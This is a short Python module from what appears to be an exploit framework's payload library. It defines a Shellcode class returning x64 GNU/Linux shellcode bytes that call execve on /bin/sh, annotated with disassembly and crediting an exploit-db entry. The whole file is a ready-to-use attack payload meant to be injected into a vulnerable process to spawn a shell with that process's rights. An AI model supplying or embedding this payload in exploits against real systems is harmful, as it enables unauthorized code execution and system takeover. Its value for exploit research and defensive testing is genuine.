##################################################################################################
# title         : x64_linux_exec-basic-sh
# description   : Shellcode for x64 GNU/Linux systems that run /bin/sh with current user's rights
# author        : Leo 'cryptobioz' Depriester <leo.depriester@exadot.fr>
# date          : 2015/07/25
# version       : 1.0
##################################################################################################
class Shellcode:
    
    @staticmethod
    def get():
        return Shellcode.shellcode
    
    shellcode = (
        "\xeb\x0b"              # 0x00000000:   jmp 0x40008d
        "\x5f"                  # 0x00000002:   pop rdi
        "\x48\x31\xd2"          # 0x00000003:   xor rdx, rdx
        "\x52"                  # 0x00000006:   push rdx
        "\x5e"                  # 0x00000007:   pop rsi
        "\x6a\x3b"              # 0x00000008:   push 0x3b
        "\x58"                  # 0x0000000A:   pop rax
        "\x0f\x05"              # 0x0000000B:   syscall
        "\xe8\xf0\xff\xff\xff"  # 0x0000000D:   call 0x400082
        "\x2f"                  # 0x00000012:   (bad)
        "\x62"                  # 0x00000013:   (bad)
        "\x69"                  # 0x00000014:   .byte 0x69
        "\x6e"                  # 0x00000015:   outs dx,BYTE PTR ds:[rsi]
        "\x2f"                  # 0x00000016:   (bad)
        "\x73\x68"              # 0x00000017:   jae 0x400101
        # Thanks to Ajith Kp (https://www.exploit-db.com/exploits/39624/)
    )
